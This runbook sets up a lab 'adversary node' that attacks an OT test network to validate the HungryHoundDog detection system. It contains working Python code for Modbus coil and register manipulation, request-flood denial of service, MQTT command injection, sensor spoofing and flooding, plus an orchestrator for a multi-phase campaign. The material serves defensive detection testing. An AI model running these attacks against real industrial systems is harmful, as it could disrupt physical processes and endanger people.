# Adversary Node (Acer) Setup Runbook

## Overview
This runbook covers the deployment of the Acer adversary node, which simulates OT network attacks for testing and validating the detection capabilities of HungryHoundDog. The node will generate Modbus protocol attacks, MQTT command injections, and other threat scenarios.

**Target Hardware**: Acer PC (or any Ubuntu Server)
**IP Address**: 192.168.100.60
**Estimated Deployment Time**: 30-45 minutes

---

## Pre-Deployment Checklist

- [ ] Ubuntu 22.04 LTS Server installed on Acer machine
- [ ] Root/sudo access available
- [ ] Static IP assigned (192.168.100.60)
- [ ] Network connectivity verified to Brain (192.168.100.50)
- [ ] Network connectivity verified to OT network (192.168.50.0/24)
- [ ] Python 3.8+ installed
- [ ] Git repository cloned or attack playbooks available

---

## Step 1: OS & System Preparation

### 1.1 Update System
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y \
  python3-pip python3-venv python3-dev \
  git curl wget vim net-tools \
  build-essential cmake \
  mosquitto-clients \
  tcpdump wireshark \
  nmap netcat-openbsd
```

### 1.2 Configure Static IP
```bash
# Identify network interface
ip addr show

# Edit netplan
sudo nano /etc/netplan/01-netcfg.yaml
```

**Netplan config:**
```yaml
network:
  version: 2
  ethernets:
    enp3s0:  # Change to your interface name
      dhcp4: no
      addresses:
        - 192.168.100.60/24
      gateway4: 192.168.100.1
      nameservers:
        addresses: [8.8.8.8, 8.8.4.4]
```

```bash
sudo netplan apply
ip addr show enp3s0  # Verify
```

### 1.3 Verify Network Connectivity
```bash
# Ping Brain server
ping -c 3 192.168.100.50

# Ping OT network gateway
ping -c 3 192.168.50.1

# Expected: All pings successful
```

---

## Step 2: Create Python Virtual Environment & Install Dependencies

### 2.1 Create venv
```bash
mkdir -p ~/hungryhounddog-adversary
cd ~/hungryhounddog-adversary
python3 -m venv venv
source venv/bin/activate
```

### 2.2 Create requirements.txt
```bash
cat > requirements.txt << 'REQS'
# Modbus protocol and attack tools
pymodbus==3.5.0
pymodbus[serial]==3.5.0

# MQTT for command injection
paho-mqtt==1.7.1

# Network utilities
scapy==2.5.0
paramiko==3.4.0

# Utilities
requests==2.31.0
pyyaml==6.0
click==8.1.7
tabulate==0.9.0
colorama==0.4.6

# Logging and monitoring
python-dotenv==1.0.0

# Data handling
pandas==2.1.0
numpy==1.24.3
REQS

# Install dependencies
pip install --upgrade pip
pip install -r requirements.txt
```

---

## Step 3: Install Modbus Attack Framework

### 3.1 Create Modbus Attack Library
```bash
mkdir -p payloads/modbus
cat > payloads/modbus/modbus_attacks.py << 'MODBUS'
"""
Modbus Protocol Attack Library
Simulates common OT attacks including:
- Command injection
- Function code exploitation
- Coil/register manipulation
- Denial of service
"""

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException
import logging
import time

logger = logging.getLogger(__name__)

class ModbusAttacker:
    def __init__(self, target_ip, target_port=502, unit_id=1):
        self.target_ip = target_ip
        self.target_port = target_port
        self.unit_id = unit_id
        self.client = None

    def connect(self):
        """Establish connection to Modbus server"""
        try:
            self.client = ModbusTcpClient(self.target_ip, port=self.target_port)
            if self.client.connect():
                logger.info(f"Connected to {self.target_ip}:{self.target_port}")
                return True
            else:
                logger.error("Failed to connect to Modbus server")
                return False
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False

    def read_coils(self, start_addr, count=10):
        """Read coil status (function 1)"""
        try:
            result = self.client.read_coils(start_addr, count, unit=self.unit_id)
            if not result.isError():
                logger.info(f"Coils read: {result.bits}")
                return result.bits
            else:
                logger.error(f"Read error: {result}")
                return None
        except Exception as e:
            logger.error(f"Exception: {e}")
            return None

    def write_single_coil(self, address, value):
        """Write single coil (function 5) - typical attack target"""
        try:
            logger.warning(f"Writing to coil {address} with value {value}")
            result = self.client.write_coil(address, value, unit=self.unit_id)
            if not result.isError():
                logger.warning(f"Coil written successfully")
                return True
            else:
                logger.error(f"Write failed: {result}")
                return False
        except Exception as e:
            logger.error(f"Exception: {e}")
            return False

    def write_multiple_coils(self, start_addr, values):
        """Write multiple coils (function 15) - batch attack"""
        try:
            logger.warning(f"Writing {len(values)} coils starting at {start_addr}")
            result = self.client.write_coils(start_addr, values, unit=self.unit_id)
            if not result.isError():
                logger.warning("Multiple coils written")
                return True
            else:
                logger.error(f"Write failed: {result}")
                return False
        except Exception as e:
            logger.error(f"Exception: {e}")
            return False

    def read_holding_registers(self, start_addr, count=10):
        """Read holding registers (function 3)"""
        try:
            result = self.client.read_holding_registers(start_addr, count, unit=self.unit_id)
            if not result.isError():
                logger.info(f"Registers read: {result.registers}")
                return result.registers
            else:
                logger.error(f"Read error: {result}")
                return None
        except Exception as e:
            logger.error(f"Exception: {e}")
            return None

    def write_single_register(self, address, value):
        """Write single register (function 6)"""
        try:
            logger.warning(f"Writing to register {address} with value {value}")
            result = self.client.write_register(address, value, unit=self.unit_id)
            if not result.isError():
                logger.warning("Register written")
                return True
            else:
                logger.error(f"Write failed: {result}")
                return False
        except Exception as e:
            logger.error(f"Exception: {e}")
            return False

    def dos_attack(self, duration_seconds=30):
        """Flood target with rapid requests (DoS)"""
        logger.warning(f"Starting DoS attack for {duration_seconds} seconds")
        start_time = time.time()
        request_count = 0
        
        while time.time() - start_time < duration_seconds:
            try:
                # Rapid fire requests
                self.client.read_coils(0, 1, unit=self.unit_id)
                request_count += 1
            except:
                pass
        
        logger.warning(f"DoS attack sent {request_count} requests")
        return request_count

    def disconnect(self):
        """Close connection"""
        if self.client:
            self.client.close()
            logger.info("Disconnected from Modbus server")

# Example usage
if __name__ == "__main__":
    attacker = ModbusAttacker("192.168.50.10")
    if attacker.connect():
        # Read initial state
        coils = attacker.read_coils(0, 10)
        
        # Attack: flip a critical coil
        attacker.write_single_coil(5, True)
        
        # Verify change
        coils_after = attacker.read_coils(0, 10)
        
        attacker.disconnect()
MODBUS
```

---

## Step 4: Install MQTT Attack Tools

### 4.1 Create MQTT Injector
```bash
cat > payloads/mqtt/mqtt_attacker.py << 'MQTT'
"""
MQTT Attack Framework
Simulates OT command injection via MQTT protocol
"""

import paho.mqtt.client as mqtt
import json
import logging
import time
from typing import Dict

logger = logging.getLogger(__name__)

class MQTTAttacker:
    def __init__(self, broker_ip, broker_port=1883, client_id="adversary-mqtt"):
        self.broker_ip = broker_ip
        self.broker_port = broker_port
        self.client_id = client_id
        self.client = None

    def connect(self):
        """Connect to MQTT broker"""
        try:
            self.client = mqtt.Client(client_id=self.client_id, protocol=mqtt.MQTTv311)
            self.client.on_connect = self._on_connect
            self.client.on_disconnect = self._on_disconnect
            self.client.connect(self.broker_ip, self.broker_port, keepalive=60)
            self.client.loop_start()
            time.sleep(1)
            logger.info(f"MQTT connected to {self.broker_ip}:{self.broker_port}")
            return True
        except Exception as e:
            logger.error(f"MQTT connection failed: {e}")
            return False

    def _on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            logger.info("MQTT broker connected")
        else:
            logger.error(f"MQTT connection failed with code {rc}")

    def _on_disconnect(self, client, userdata, rc):
        logger.info("MQTT broker disconnected")

    def publish_command(self, topic: str, payload: Dict):
        """Publish malicious command to MQTT topic"""
        try:
            message = json.dumps(payload)
            logger.warning(f"Publishing to {topic}: {message}")
            self.client.publish(topic, message, qos=1)
            time.sleep(0.5)
            return True
        except Exception as e:
            logger.error(f"Publish failed: {e}")
            return False

    def command_injection(self, device_id: str, command: str, value):
        """Inject control command into device"""
        topic = f"ot/devices/{device_id}/cmd"
        payload = {
            "timestamp": int(time.time()),
            "command": command,
            "value": value,
            "attacker": "hungryhounddog-adversary"
        }
        return self.publish_command(topic, payload)

    def sensor_spoofing(self, sensor_id: str, fake_reading: float):
        """Spoof sensor reading"""
        topic = f"ot/sensors/{sensor_id}/value"
        payload = {
            "timestamp": int(time.time()),
            "value": fake_reading,
            "unit": "unknown"
        }
        return self.publish_command(topic, payload)

    def flood_attack(self, topic: str, duration_seconds: int = 30):
        """Flood MQTT topic with messages"""
        logger.warning(f"MQTT flood attack on {topic} for {duration_seconds}s")
        start_time = time.time()
        msg_count = 0
        
        while time.time() - start_time < duration_seconds:
            payload = {
                "flood": True,
                "timestamp": int(time.time()),
                "sequence": msg_count
            }
            self.publish_command(topic, payload)
            msg_count += 1
            time.sleep(0.01)
        
        logger.warning(f"Flood attack sent {msg_count} messages")
        return msg_count

    def disconnect(self):
        """Disconnect from MQTT broker"""
        if self.client:
            self.client.loop_stop()
            self.client.disconnect()
            logger.info("MQTT disconnected")

if __name__ == "__main__":
    attacker = MQTTAttacker("192.168.100.50", 1883)
    if attacker.connect():
        # Inject command
        attacker.command_injection("pump-1", "setspeed", 150)
        
        # Spoof sensor
        attacker.sensor_spoofing("temp-sensor-1", 99.5)
        
        time.sleep(2)
        attacker.disconnect()
MQTT
```

---

## Step 5: Create Attack Playbook Orchestrator

### 5.1 Create Main Attack Playbook Script
```bash
cat > attack_playbook.py << 'PLAYBOOK'
#!/usr/bin/env python3
"""
HungryHoundDog Adversary - Attack Playbook Orchestrator

Executes coordinated attack scenarios:
1. Reconnaissance (port scan, Modbus enumeration)
2. Exploitation (Modbus write, MQTT injection)
3. Persistence (repeated commands)
4. Exfiltration (data extraction)
"""

import logging
import argparse
import time
import json
from datetime import datetime
from payloads.modbus.modbus_attacks import ModbusAttacker
from payloads.mqtt.mqtt_attacker import MQTTAttacker

# Setup logging
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    handlers=[
        logging.FileHandler('attacks.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

class AttackPlaybook:
    def __init__(self, target_ot_network="192.168.50.0/24", mqtt_broker="192.168.100.50"):
        self.target_network = target_ot_network
        self.mqtt_broker = mqtt_broker
        self.results = []

    def reconnaissance_phase(self):
        """Phase 1: Scan for Modbus devices"""
        logger.info("=== RECONNAISSANCE PHASE ===")
        targets = [
            "192.168.50.10",
            "192.168.50.11",
            "192.168.50.12"
        ]
        
        for target in targets:
            logger.info(f"Probing {target} for Modbus...")
            attacker = ModbusAttacker(target)
            if attacker.connect():
                logger.warning(f"Modbus service found on {target}")
                coils = attacker.read_coils(0, 10)
                registers = attacker.read_holding_registers(0, 10)
                self.results.append({
                    "phase": "reconnaissance",
                    "target": target,
                    "status": "discovered",
                    "coils": coils,
                    "registers": registers
                })
                attacker.disconnect()
            else:
                logger.debug(f"No Modbus on {target}")

    def exploitation_phase_modbus(self):
        """Phase 2: Execute Modbus attacks"""
        logger.info("=== EXPLOITATION PHASE (Modbus) ===")
        
        target = "192.168.50.10"
        attacker = ModbusAttacker(target)
        
        if attacker.connect():
            # Attack 1: Write malicious coil value
            logger.warning("Executing: Coil manipulation attack")
            attacker.write_single_coil(5, True)
            
            # Attack 2: Modify holding register
            logger.warning("Executing: Register manipulation attack")
            attacker.write_single_register(10, 0xDEAD)
            
            # Attack 3: Batch coil write
            logger.warning("Executing: Batch coil write attack")
            attacker.write_multiple_coils(0, [True, False, True, True])
            
            self.results.append({
                "phase": "exploitation",
                "protocol": "modbus",
                "target": target,
                "attacks": ["coil_write", "register_write", "batch_coil_write"],
                "status": "completed"
            })
            
            attacker.disconnect()

    def exploitation_phase_mqtt(self):
        """Phase 2b: Execute MQTT attacks"""
        logger.info("=== EXPLOITATION PHASE (MQTT) ===")
        
        attacker = MQTTAttacker(self.mqtt_broker)
        
        if attacker.connect():
            # Attack 1: Command injection
            logger.warning("Executing: MQTT command injection")
            attacker.command_injection("pump-1", "emergency_stop", 1)
            
            # Attack 2: Sensor spoofing
            logger.warning("Executing: Sensor spoofing attack")
            attacker.sensor_spoofing("temperature-1", 120.0)
            
            # Attack 3: MQTT flood
            logger.warning("Executing: MQTT DoS flood (10s)")
            msg_count = attacker.flood_attack("ot/control/broadcast", duration_seconds=10)
            
            self.results.append({
                "phase": "exploitation",
                "protocol": "mqtt",
                "broker": self.mqtt_broker,
                "attacks": ["command_injection", "sensor_spoofing", "mqtt_flood"],
                "flood_messages": msg_count,
                "status": "completed"
            })
            
            attacker.disconnect()

    def persistence_phase(self):
        """Phase 3: Maintain access with repeated attacks"""
        logger.info("=== PERSISTENCE PHASE ===")
        
        target = "192.168.50.10"
        attacker = ModbusAttacker(target)
        
        if attacker.connect():
            for i in range(5):  # Repeat 5 times
                logger.warning(f"Persistence iteration {i+1}/5")
                attacker.write_single_coil(5, (i % 2) == 0)
                time.sleep(2)
            
            self.results.append({
                "phase": "persistence",
                "target": target,
                "iterations": 5,
                "interval_seconds": 2,
                "status": "completed"
            })
            
            attacker.disconnect()

    def exfiltration_phase(self):
        """Phase 4: Extract data from OT network"""
        logger.info("=== EXFILTRATION PHASE ===")
        
        target = "192.168.50.10"
        attacker = ModbusAttacker(target)
        
        if attacker.connect():
            # Extract configuration data
            logger.warning("Extracting system configuration...")
            registers = attacker.read_holding_registers(0, 100)
            coils = attacker.read_coils(0, 100)
            
            # Save extracted data
            exfil_data = {
                "timestamp": datetime.utcnow().isoformat(),
                "target": target,
                "registers": registers,
                "coils": coils
            }
            
            with open("exfiltrated_data.json", "w") as f:
                json.dump(exfil_data, f, indent=2)
            
            logger.warning("Data exfiltrated to exfiltrated_data.json")
            
            self.results.append({
                "phase": "exfiltration",
                "target": target,
                "data_points": len(registers) + len(coils) if registers and coils else 0,
                "status": "completed"
            })
            
            attacker.disconnect()

    def run_full_campaign(self):
        """Execute all attack phases sequentially"""
        logger.warning("="*60)
        logger.warning("STARTING HUNGRYHOUNDDOG ADVERSARY CAMPAIGN")
        logger.warning(f"Target Network: {self.target_network}")
        logger.warning(f"MQTT Broker: {self.mqtt_broker}")
        logger.warning(f"Start Time: {datetime.utcnow().isoformat()}")
        logger.warning("="*60)
        
        try:
            self.reconnaissance_phase()
            time.sleep(2)
            
            self.exploitation_phase_modbus()
            time.sleep(2)
            
            self.exploitation_phase_mqtt()
            time.sleep(2)
            
            self.persistence_phase()
            time.sleep(2)
            
            self.exfiltration_phase()
            
        except Exception as e:
            logger.error(f"Campaign execution failed: {e}")
        
        # Save results
        self.save_results()

    def save_results(self):
        """Save attack results to file"""
        results_file = f"attack_results_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
        with open(results_file, "w") as f:
            json.dump(self.results, f, indent=2)
        logger.info(f"Results saved to {results_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HungryHoundDog Adversary Playbook")
    parser.add_argument("--target-network", default="192.168.50.0/24", help="OT network CIDR")
    parser.add_argument("--mqtt-broker", default="192.168.100.50", help="MQTT broker IP")
    parser.add_argument("--phase", choices=["recon", "exploit", "persistence", "exfil", "full"],
                        default="full", help="Which attack phase to run")
    
    args = parser.parse_args()
    
    playbook = AttackPlaybook(args.target_network, args.mqtt_broker)
    
    if args.phase == "recon":
        playbook.reconnaissance_phase()
    elif args.phase == "exploit":
        playbook.exploitation_phase_modbus()
        playbook.exploitation_phase_mqtt()
    elif args.phase == "persistence":
        playbook.persistence_phase()
    elif args.phase == "exfil":
        playbook.exfiltration_phase()
    else:  # full
        playbook.run_full_campaign()
PLAYBOOK

chmod +x attack_playbook.py
```

---

## Step 6: Create Run Scripts

### 6.1 Create Individual Attack Scripts
```bash
mkdir -p scripts

cat > scripts/run_modbus_attack.sh << 'BASH'
#!/bin/bash
source ../venv/bin/activate
python ../payloads/modbus/modbus_attacks.py
BASH

chmod +x scripts/run_modbus_attack.sh

cat > scripts/run_mqtt_attack.sh << 'BASH'
#!/bin/bash
source ../venv/bin/activate
python ../payloads/mqtt/mqtt_attacker.py
BASH

chmod +x scripts/run_mqtt_attack.sh

cat > scripts/run_full_campaign.sh << 'BASH'
#!/bin/bash
cd ~/hungryhounddog-adversary
source venv/bin/activate
python attack_playbook.py --phase full
echo "Campaign completed. Check attacks.log for details."
BASH

chmod +x scripts/run_full_campaign.sh
```

---

## Step 7: Security & Isolation

### 7.1 Configure Firewall
```bash
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Allow SSH from management network
sudo ufw allow from 192.168.100.70 to any port 22

# Allow outbound to OT network
sudo ufw allow out to 192.168.50.0/24

# Allow communication with Brain (MQTT)
sudo ufw allow out to 192.168.100.50 port 1883

# Verify
sudo ufw status
```

### 7.2 Create Isolated User (Optional)
```bash
# Run attacks as non-privileged user
sudo useradd -m -s /bin/bash adversary
sudo usermod -aG sudo adversary
```

---

## Step 8: Testing & Validation

### 8.1 Test Modbus Attack
```bash
source venv/bin/activate
python payloads/modbus/modbus_attacks.py
# Expected: Connection attempts logged, attacks executed
```

### 8.2 Test MQTT Attack
```bash
source venv/bin/activate
python payloads/mqtt/mqtt_attacker.py
# Expected: MQTT connection, messages published
```

### 8.3 Run Full Campaign (with Brain running)
```bash
./scripts/run_full_campaign.sh

# Monitor detection on Brain:
# 1. Check Grafana: http://192.168.100.50:3000
# 2. Query OpenSearch alerts
# 3. Review Ollama analysis
```

---

## Maintenance

### Attack Log Review
```bash
# Real-time attack log
tail -f attacks.log

# Summary of attacks
grep "WARNING" attacks.log | wc -l
```

### Update Attack Playbooks
```bash
# Modify attack_playbook.py to add new scenarios
# Test each change in isolation before full campaign
```

---

## Safety Notes

**IMPORTANT**: Only run attacks on networks you own or have explicit permission to test. Use responsibly!
